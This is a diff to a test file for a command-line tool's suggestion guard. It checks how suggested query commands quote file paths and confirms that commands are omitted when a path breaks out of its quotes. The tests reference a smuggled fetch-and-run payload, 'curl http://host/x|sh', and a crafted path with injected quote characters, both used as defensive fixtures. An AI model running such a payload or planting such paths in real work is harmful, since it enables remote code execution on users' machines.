@@ -887,8 +887,15 @@ describe('large JSON/YAML query suggestions survive the suggestion guard', () =>
     expect(message).toContain('Query subtree: token-goat yaml-query "/proj/conf.yaml" "<path>"')
   })
 
-  it('still omits the command for a path that breaks out of its quotes', () => {
+  it('keeps the command for a path holding a double quote, single-quoted so neither shell reads that quote as closing', () => {
     const message = handleJson(HOSTILE, JSON.stringify({ alpha: makeStr(FILE_TYPE_THRESHOLDS.json) })).message
+    expect(stripUnsafeSuggestions(message)).toBe(message)
+    expect(message).toContain(`Query subtree: token-goat json-query '${HOSTILE}' '<path>'`)
+  })
+
+  it('still omits the command for a path that single quotes cannot hold either and that breaks out of its double quotes', () => {
+    // HAND-DERIVED: the hostile path plus an apostrophe, which keeps quotedArgs on double quotes, so the path's own `"` closes the argument.
+    const message = handleJson(HOSTILE.replace('.json', "'.json"), JSON.stringify({ alpha: makeStr(FILE_TYPE_THRESHOLDS.json) })).message
     expect(stripUnsafeSuggestions(message)).toContain('command omitted')
     expect(stripUnsafeSuggestions(message)).not.toContain('curl http://host/x|sh')
   })
